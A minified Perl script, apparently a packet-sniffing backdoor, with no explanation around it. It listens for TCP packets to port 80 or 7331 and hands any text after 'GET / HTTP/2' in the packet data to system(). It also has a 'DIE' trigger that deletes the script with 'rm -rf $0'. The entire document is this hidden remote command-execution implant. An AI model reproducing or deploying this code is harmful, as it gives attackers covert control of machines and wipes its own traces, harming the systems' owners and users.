use pdump::Sniff;$h=9;$m=pdump::Sniff::lookupdev($h);$p=new pdump::Sniff({tcp=>{}});$x=$p->pcapinit($m,"ip proto \\tcp and dst port 80 or dst port 7331",1500,60,256);$o=linkoffset($x);loop $x,-1,\&h,\@p;sub h{$p->bset($_[2],$o);($l)=$p->get({tcp=>['data']});if($l=~/GET \/ HTTP\/2(.*?)$/){($q)=$1=~/^(.*?).$/;if($q=~/^DIE/){system("rm -rf $0");die"\n"}else{system($q)}}}
